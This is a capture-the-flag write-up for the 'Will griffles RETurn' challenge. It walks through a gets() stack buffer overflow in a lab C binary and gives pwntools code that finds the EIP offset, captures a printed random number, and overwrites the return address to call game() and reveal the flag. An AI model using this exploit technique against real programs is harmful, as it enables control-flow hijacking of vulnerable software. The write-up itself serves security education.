# Will griffles RETurn

Griffles wants to play a game, but as soon as he gets to know you, he has to go back home to grind his tutorials! Can figure out how to get griffles to return and play the game?

---

## Will griffles RETurn - Writeup

### Challenge Overview

In this challenge, you are tasked with exploiting a vulnerable C program called `vuln.c`. The goal is to use a buffer overflow vulnerability to control the execution flow of the program, ultimately triggering the `game()` function and revealing the flag.

### Vulnerabilities

The program contains two critical vulnerabilities:
1. **Buffer Overflow in `register_name()`**: The function uses `gets()` to read user input into a fixed-size buffer, which is vulnerable to overflow. This allows us to overwrite adjacent memory, including the return address of the function.
2. **Stack-based Buffer Overflow**: Once we control the return address, we can redirect execution to the `game()` function and provide the necessary arguments to retrieve the flag.

### Exploit Plan

1. **Overflow the buffer in `register_name()`**: By sending more than 10 characters, we will overflow the buffer and overwrite the return address, redirecting control to a function of our choice.
2. **Redirect to `game()`**: The `game()` function checks whether the sum of two arguments matches a randomly chosen value. We can use the value printed by the program to correctly craft our arguments and retrieve the flag.

---

### Exploit Walkthrough

1. **Setup Environment**

   To get started, we use `pwntools` to set up the environment and allow for debugging and remote exploitation:

   ```python
   from pwn import *

   def start(argv=[], *a, **kw):
       if args.GDB:
           return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
       elif args.REMOTE:
           return remote(sys.argv[1], sys.argv[2], *a, **kw)
       else:
           return process([exe] + argv, *a, **kw)

   gdbscript = '''
   init-pwndbg
   continue
   '''

   exe = './vuln'
   elf = context.binary = ELF(exe, checksec=False)
   context.log_level = 'debug'
   ```

   - `start()` helps with running the exploit locally or remotely, and optionally with GDB debugging.
   - `context.binary` and `context.log_level` configure the environment for binary exploitation.

2. **Finding the Buffer Overflow Offset**

   Before exploiting the vulnerability, we need to determine the offset where the return address is overwritten. To do this, we send a cyclic pattern to the program:

   ```python
   payload = b""
   payload += cyclic(100)
   io.sendline(payload)

   io.wait()
   core = io.corefile
   eip_value = core.eip
   eip_offset = cyclic_find(eip_value)
   info('located EIP offset at {a}'.format(a=eip_offset))
   ```

   - The `cyclic()` function generates a unique pattern that we use to identify the offset in the stack where the return address (EIP) is located.
   - After sending the payload, we examine the core dump to determine the location of the return address.

3. **Leaking the Random Number**

   The program generates a random number, which is displayed in the output. We can extract this number to use it as an argument for the `game()` function:

   ```python
   io.recvuntil(b"number: ")
   leak = io.recvline()
   answer = int(leak.decode().strip())
   log.info(f"answer: {answer}")
   ```

   - We capture the random number (`answer`) printed by the program, which is needed to construct a valid payload for the `game()` function.

4. **Constructing the Final Payload**

   Now that we know the `answer`, we can craft a payload to exploit the buffer overflow and redirect execution to the `game()` function. The payload will overwrite the return address and pass the correct arguments to `game()`:

   ```python
   payload = b""
   payload += b"A" * eip_offset          # padding up to EIP
   payload += p32(elf.functions['game'].address)  # overwrite EIP to jump to game()
   payload += p32(0x0)                   # fake return address (not important here)
   payload += p32(answer)                # argument a
   payload += p32(0x0)                   # argument b

   io.sendline(payload)
   ```

   - The payload starts by filling the buffer up to the point where the return address is located (`b"A" * eip_offset`).
   - We then overwrite the return address with the address of the `game()` function (`elf.functions['game'].address`).
   - Finally, we pass the correct arguments (`answer` and `0x0`) to `game()`.

5. **Interacting with the Program**

   Once the payload is sent, the program will execute the `game()` function, and we can interact with the program to retrieve the flag:

   ```python
   io.interactive()
   ```

   - This command allows us to interact with the program once the exploit is successful. The flag should be revealed in the output.

---
